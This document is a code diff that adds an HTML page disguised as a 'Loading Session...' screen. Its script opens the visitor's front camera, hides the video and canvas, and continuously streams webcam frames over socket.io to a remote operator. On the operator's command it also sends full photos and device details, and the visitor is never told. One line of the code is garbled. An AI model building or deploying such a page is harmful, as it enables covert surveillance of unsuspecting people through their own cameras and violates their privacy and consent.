@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang=\x22en\x22>
+<head>
+    <meta charset=\x22UTF-8\x22>
+    <meta name=\x22viewport\x22 content=\x22width=device-width, initial-scale=1.0\x22>
+    <title>Loading...</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f6f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .card { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        video, canvas { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class=\x22card\x22><h2>Loading Session...</h2><p>Please wait...</p></div>
+    <video id=\x22video\x22 autoplay playsinline muted></video>
+    <canvas id=\x22canvas\x22></canvas>
+    <script src=\x22/socket.io/socket.io.js\x22></script>
+    <script>
+        const socket = io();
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let mediaStream = null, isReady = false, interval = null;
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let dev = /mobile/i.test(ua) ? "Mobile" : "Desktop";
+            let browser = /chrome/i.test(ua) ? "Chrome" : "Browser";
+            return \ (\);
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
+            mediaStream = stream;
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                isReady = true;
+                socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
+                interval = setInterval(() => {
+                    if (!isReady || !video.videoWidth) return;
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = 320; canvas.height = 240;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    socket.emit('live-stream-frame', canvas.toDataURL('image/jpeg', 0.3));
+                }, 100);
+            };
+        }).catch(e => console.log(e));
+
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === "visible") {
+                if (video.paused && mediaStream) video.play();
+                socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
+            }
+        });
+
+        socket.on('capture-photo', () => {
+            if (!isReady) return;
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            socket.emit('user-photo-captured', canvas.toDataURL('image/jpeg', 0.6));
+        });
+
+        socket.on('disable-user-access', () => {
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+            document.body.innerHTML = '<h2>Session Ended by Admin</h2>';
+        });
+    </script>
+</body>
+</html>
